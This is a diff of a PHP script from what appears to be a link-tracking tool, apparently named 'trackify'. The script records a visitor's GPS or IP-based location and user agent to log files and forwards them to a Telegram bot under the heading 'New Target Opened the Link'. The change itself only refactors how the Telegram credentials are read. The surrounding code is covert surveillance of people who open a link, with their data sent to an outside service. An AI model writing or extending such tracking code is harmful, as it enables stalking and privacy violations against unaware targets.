@@ -99,21 +99,11 @@ error_log(trim($locationDisplay));
 @file_put_contents('location.log', $locationDisplay . "\n", FILE_APPEND | LOCK_EX);
 @file_put_contents($captureDir . '/location_notify.txt', $locationDisplay, LOCK_EX);
 
-// Send to Telegram
-$telegram_token = '';
-$telegram_chat = '';
-$config_file = 'telegram_config.json';
+$tg = trackify_read_telegram_credentials();
+$telegram_token = $tg['bot_token'] ?? '';
+$telegram_chat = $tg['chat_id'] ?? '';
 
-if (file_exists($config_file)) {
-    $config_content = file_get_contents($config_file);
-    $config = json_decode($config_content, true);
-    if ($config && isset($config['bot_token']) && isset($config['chat_id'])) {
-        $telegram_token = $config['bot_token'];
-        $telegram_chat = $config['chat_id'];
-    }
-}
-
-if (!empty($telegram_token) && !empty($telegram_chat)) {
+if ($telegram_token !== '' && $telegram_chat !== '') {
     $sourceLabel = ($geo['source'] ?? '') === 'gps' ? 'GPS (Device)' : 'IP Geolocation';
     $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
     $message = "📍 *New Target Opened the Link*\n\n";
